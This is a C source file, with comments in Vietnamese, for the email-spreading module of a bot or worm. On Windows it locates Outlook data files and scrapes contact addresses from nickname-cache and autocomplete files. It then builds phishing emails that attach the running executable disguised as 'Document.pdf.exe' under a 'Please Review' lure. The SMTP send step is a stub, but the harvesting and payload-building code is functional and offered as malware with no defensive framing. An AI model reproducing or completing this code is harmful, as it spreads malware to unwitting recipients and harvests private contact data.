/**
 * spreader_email.c
 * Lan truyen qua email: tim file PST/OST Outlook, trich xuat danh ba, gui email
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
    #include <windows.h>
    #include <shlobj.h>
    #include <winhttp.h>
    #pragma comment(lib, "winhttp.lib")
#else
    #include <unistd.h>
    #include <sys/stat.h>
    #include <dirent.h>
    #include <pwd.h>
#endif

#include "spreader_email.h"

#ifdef _WIN32
/* ==================== WINDOWS EMAIL SPREADER ==================== */

/**
 * Tim file PST/OST cua Outlook
 */
static int tim_file_outlook(char* danh_sach_file, size_t kich_thuoc) {
    char appdata[512];
    if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdata) != S_OK) {
        return 0;
    }
    
    char outlook_path[512];
    snprintf(outlook_path, sizeof(outlook_path), 
             "%s\\Microsoft\\Outlook", appdata);
    
    int offset = 0;
    offset += snprintf(danh_sach_file + offset, kich_thuoc - offset, "[");
    int so_file = 0;
    
    /* Tim file .pst va .ost */
    const char* patterns[] = {"*.pst", "*.ost", NULL};
    
    for (int p = 0; patterns[p] != NULL; p++) {
        char search_path[512];
        snprintf(search_path, sizeof(search_path), "%s\\%s", outlook_path, patterns[p]);
        
        WIN32_FIND_DATAA find_data;
        HANDLE find_handle = FindFirstFileA(search_path, &find_data);
        
        if (find_handle != INVALID_HANDLE_VALUE) {
            do {
                if (so_file > 0) {
                    offset += snprintf(danh_sach_file + offset, kich_thuoc - offset, ",");
                }
                
                offset += snprintf(danh_sach_file + offset, kich_thuoc - offset,
                    "{\"filename\":\"%s\",\"size\":%lu}",
                    find_data.cFileName, find_data.nFileSizeLow);
                so_file++;
                
            } while (FindNextFileA(find_handle, &find_data) && so_file < 50);
            FindClose(find_handle);
        }
    }
    
    offset += snprintf(danh_sach_file + offset, kich_thuoc - offset, "]");
    return so_file;
}

/**
 * Trich xuat danh ba email tu Outlook (thong qua MAPI hoac file NK2)
 */
static int trich_xuat_danh_ba_email(char* danh_sach_email, size_t kich_thuoc) {
    /* Tim file NK2 (Outlook nickname cache) */
    char appdata[512];
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata) != S_OK) {
        return 0;
    }
    
    char outlook_path[512];
    snprintf(outlook_path, sizeof(outlook_path), 
             "%s\\Microsoft\\Outlook", appdata);
    
    int offset = 0;
    offset += snprintf(danh_sach_email + offset, kich_thuoc - offset, "[");
    int so_email = 0;
    
    /* Tim file .nk2 */
    char search_path[512];
    snprintf(search_path, sizeof(search_path), "%s\\*.nk2", outlook_path);
    
    WIN32_FIND_DATAA find_data;
    HANDLE find_handle = FindFirstFileA(search_path, &find_data);
    
    if (find_handle != INVALID_HANDLE_VALUE) {
        do {
            char file_path[512];
            snprintf(file_path, sizeof(file_path), "%s\\%s", outlook_path, find_data.cFileName);
            
            /* Doc file NK2 de trich xuat email */
            HANDLE file = CreateFileA(file_path, GENERIC_READ, FILE_SHARE_READ,
                                       NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            if (file != INVALID_HANDLE_VALUE) {
                DWORD file_size = GetFileSize(file, NULL);
                if (file_size < 1048576) { /* < 1MB */
                    char* buffer = (char*)malloc(file_size);
                    if (buffer != NULL) {
                        DWORD bytes_doc;
                        ReadFile(file, buffer, file_size, &bytes_doc, NULL);
                        
                        /* Tim cac chuoi email (@) */
                        char* ptr = buffer;
                        char* end = buffer + bytes_doc;
                        
                        while (ptr < end - 5 && so_email < 100) {
                            /* Tim '@' */
                            char* at_pos = memchr(ptr, '@', end - ptr);
                            if (at_pos == NULL) break;
                            
                            /* Tim bat dau email (lui lai den ky tu khong hop le) */
                            char* start = at_pos;
                            while (start > buffer && start > ptr) {
                                char c = *(start - 1);
                                if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
                                    (c >= '0' && c <= '9') || c == '.' || c == '-' || c == '_') {
                                    start--;
                                } else {
                                    break;
                                }
                            }
                            
                            /* Tim ket thuc email (tien den ky tu khong hop le) */
                            char* end_email = at_pos;
                            while (end_email < end) {
                                char c = *end_email;
                                if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
                                    (c >= '0' && c <= '9') || c == '.' || c == '-') {
                                    end_email++;
                                } else {
                                    break;
                                }
                            }
                            
                            size_t email_len = end_email - start;
                            if (email_len > 5 && email_len < 255) {
                                char email[256];
                                strncpy(email, start, email_len);
                                email[email_len] = '\0';
                                
                                if (strchr(email, '.') != NULL && 
                                    strchr(email, '@') != NULL) {
                                    if (so_email > 0) {
                                        offset += snprintf(danh_sach_email + offset, 
                                                         kich_thuoc - offset, ",");
                                    }
                                    offset += snprintf(danh_sach_email + offset,
                                                     kich_thuoc - offset, "\"%s\"", email);
                                    so_email++;
                                }
                            }
                            
                            ptr = end_email;
                        }
                        
                        free(buffer);
                    }
                }
                CloseHandle(file);
            }
        } while (FindNextFileA(find_handle, &find_data) && so_email < 100);
        FindClose(find_handle);
    }
    
    /* Tim trong file Autocomplete Stream */
    snprintf(search_path, sizeof(search_path), "%s\\*.dat", outlook_path);
    find_handle = FindFirstFileA(search_path, &find_data);
    
    if (find_handle != INVALID_HANDLE_VALUE) {
        do {
            /* Doc file Stream_Autocomplete */
            if (strstr(find_data.cFileName, "Stream_Autocomplete") != NULL) {
                char file_path[512];
                snprintf(file_path, sizeof(file_path), "%s\\%s", outlook_path, find_data.cFileName);
                
                HANDLE file = CreateFileA(file_path, GENERIC_READ, FILE_SHARE_READ,
                                           NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
                if (file != INVALID_HANDLE_VALUE) {
                    DWORD file_size = GetFileSize(file, NULL);
                    if (file_size < 1048576) {
                        char* buffer = (char*)malloc(file_size + 1);
                        if (buffer != NULL) {
                            DWORD bytes_doc;
                            ReadFile(file, buffer, file_size, &bytes_doc, NULL);
                            buffer[bytes_doc] = '\0';
                            
                            /* Tim SMTP: */
                            char* ptr = buffer;
                            while ((ptr = strstr(ptr, "SMTP:")) != NULL && so_email < 100) {
                                ptr += 5;
                                char* end = strchr(ptr, '\0');
                                char* end2 = strchr(ptr, ' ');
                                if (end2 != NULL && end2 < end) end = end2;
                                
                                size_t len = end - ptr;
                                if (len > 5 && len < 255 && strchr(ptr, '@') != NULL) {
                                    if (so_email > 0) {
                                        offset += snprintf(danh_sach_email + offset,
                                                         kich_thuoc - offset, ",");
                                    }
                                    char email[256];
                                    strncpy(email, ptr, len);
                                    email[len] = '\0';
                                    offset += snprintf(danh_sach_email + offset,
                                                     kich_thuoc - offset, "\"%s\"", email);
                                    so_email++;
                                }
                            }
                            free(buffer);
                        }
                    }
                    CloseHandle(file);
                }
            }
        } while (FindNextFileA(find_handle, &find_data) && so_email < 100);
        FindClose(find_handle);
    }
    
    offset += snprintf(danh_sach_email + offset, kich_thuoc - offset, "]");
    return so_email;
}

/**
 * Gui email co attachment la bot
 */
static int gui_email_spread(const char* nguoi_nhan, const char* may_chu_smtp,
                            int cong_smtp, const char* username, const char* password) {
    /* Tao email voi attachment */
    char duong_dan_bot[1024];
    GetModuleFileNameA(NULL, duong_dan_bot, sizeof(duong_dan_bot));
    
    /* Doc file bot va encode base64 */
    HANDLE file = CreateFileA(duong_dan_bot, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE) return -1;
    
    DWORD file_size = GetFileSize(file, NULL);
    if (file_size > 1048576) { /* < 1MB */
        CloseHandle(file);
        return -1;
    }
    
    char* file_data = (char*)malloc(file_size);
    DWORD bytes_doc;
    ReadFile(file, file_data, file_size, &bytes_doc, NULL);
    CloseHandle(file);
    
    /* Base64 encode */
    const char b64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    size_t b64_size = ((file_size + 2) / 3) * 4 + 1;
    char* b64_data = (char*)malloc(b64_size);
    
    size_t b64_offset = 0;
    for (DWORD i = 0; i < file_size; i += 3) {
        unsigned char a = file_data[i];
        unsigned char b = (i + 1 < file_size) ? file_data[i + 1] : 0;
        unsigned char c = (i + 2 < file_size) ? file_data[i + 2] : 0;
        b64_data[b64_offset++] = b64_chars[a >> 2];
        b64_data[b64_offset++] = b64_chars[((a & 0x03) << 4) | (b >> 4)];
        b64_data[b64_offset++] = (i + 1 < file_size) ? b64_chars[((b & 0x0f) << 2) | (c >> 6)] : '=';
        b64_data[b64_offset++] = (i + 2 < file_size) ? b64_chars[c & 0x3f] : '=';
    }
    b64_data[b64_offset] = '\0';
    
    free(file_data);
    
    /* Tao noi dung email */
    char email_content[16384];
    int content_len = snprintf(email_content, sizeof(email_content),
        "From: %s\r\n"
        "To: %s\r\n"
        "Subject: Important Document - Please Review\r\n"
        "MIME-Version: 1.0\r\n"
        "Content-Type: multipart/mixed; boundary=\"BOUNDARY123\"\r\n"
        "\r\n"
        "--BOUNDARY123\r\n"
        "Content-Type: text/plain; charset=\"UTF-8\"\r\n"
        "\r\n"
        "Hello,\r\n\r\n"
        "Please find the attached document for your review.\r\n\r\n"
        "Best regards\r\n"
        "\r\n"
        "--BOUNDARY123\r\n"
        "Content-Type: application/octet-stream; name=\"Document.pdf.exe\"\r\n"
        "Content-Transfer-Encoding: base64\r\n"
        "Content-Disposition: attachment; filename=\"Document.pdf.exe\"\r\n"
        "\r\n"
        "%s\r\n"
        "--BOUNDARY123--\r\n",
        username, nguoi_nhan, b64_data);
    
    free(b64_data);
    
    /* Gui email qua SMTP */
    /* Su dung WinHTTP hoac socket de ket noi SMTP */
    /* (Stub - can SMTP client day du) */
    
    printf("[EMAIL] Da tao email cho: %s\n", nguoi_nhan);
    return 0;
}

/**
 * Spread qua email
 */
int spread_email(void) {
    char danh_sach_email[32768] = {0};
    int so_email = trich_xuat_danh_ba_email(danh_sach_email, sizeof(danh_sach_email));
    
    printf("[EMAIL] Tim thay %d email\n", so_email);
    
    if (so_email == 0) return 0;
    
    /* Gui email den 10 nguoi dau tien */
    int so_da_gui = 0;
    char* ptr = danh_sach_email;
    
    while (*ptr != '\0' && so_da_gui < 10) {
        if (*ptr == '"') {
            ptr++;
            char email[256];
            int i = 0;
            while (*ptr != '"' && *ptr != '\0' && i < 250) {
                email[i++] = *ptr++;
            }
            email[i] = '\0';
            if (*ptr == '"') ptr++;
            
            if (strlen(email) > 0 && strchr(email, '@') != NULL) {
                /* Thu gui email (dung SMTP mac dinh) */
                /* Trong thu te can cau hinh SMTP server */
                so_da_gui++;
            }
        } else {
            ptr++;
        }
    }
    
    return so_da_gui;
}

#else
/* ==================== LINUX EMAIL SPREADER ==================== */

int spread_email(void) {
    printf("[EMAIL] Chua ho tro tren Linux\n");
    return 0;
}

#endif